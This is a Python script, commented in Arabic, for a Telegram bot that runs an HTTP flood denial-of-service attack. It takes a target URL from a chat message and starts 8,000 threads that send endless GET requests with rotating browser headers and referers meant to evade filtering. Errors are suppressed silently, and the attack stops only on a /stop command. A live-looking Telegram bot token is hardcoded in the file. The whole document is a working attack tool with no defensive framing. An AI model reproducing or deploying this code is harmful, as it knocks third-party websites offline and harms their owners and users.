import requests
import threading
import random
import telebot

# متغير لتتبع حالة إيقاف الهجوم
stop_attack_flag = False

# قائمة برؤوس HTTP مختلفة
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
]

def get_random_headers():
    """إرجاع رؤوس HTTP عشوائية."""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }

def send_requests(target):
    """إرسال طلبات HTTP بشكل مستمر."""
    global stop_attack_flag
    while not stop_attack_flag:
        try:
            headers = get_random_headers()
            requests.get(target, headers=headers, timeout=5)
        except requests.exceptions.RequestException:
            pass  # تجاهل جميع الأخطاء دون طباعة أي رسائل

def start_attack(target, num_threads=8000):
    """بدء الهجوم باستخدام عدد من الخيوط."""
    global stop_attack_flag
    stop_attack_flag = False

    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(target,))
        thread.daemon = True  # يجعل الخيط يتوقف عند توقف البرنامج الرئيسي
        thread.start()

# إعداد telebot
bot = telebot.TeleBot("7248287448:AAFQcPnXrEaNaIFM-Lx_3VizIiv_9glWXCA")

@bot.message_handler(commands=['start'])
def handle_start(message):
    """عند الضغط على /start، يطلب الرابط."""
    bot.reply_to(message, "أهلاً! أرسل الرابط المستهدف لبدء الهجوم.")
    bot.register_next_step_handler(message, handle_target)

def handle_target(message):
    """معالجة الرابط المستهدف."""
    global stop_attack_flag
    target = message.text
    if not target.startswith(("http://", "https://")):
        bot.reply_to(message, "الرابط غير صالح. يرجى إرسال رابط يبدأ بـ http:// أو https://")
        return

    bot.reply_to(message, f"بدأ الهجوم على {target}...")
    stop_attack_flag = False  # تأكد من إعادة تعيين العلم
    start_attack(target)

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    """عند الضغط على /stop، يتم إيقاف الهجوم."""
    global stop_attack_flag
    stop_attack_flag = True
    bot.reply_to(message, "تم إيقاف الهجوم.")

if __name__ == "__main__":
    bot.polling()
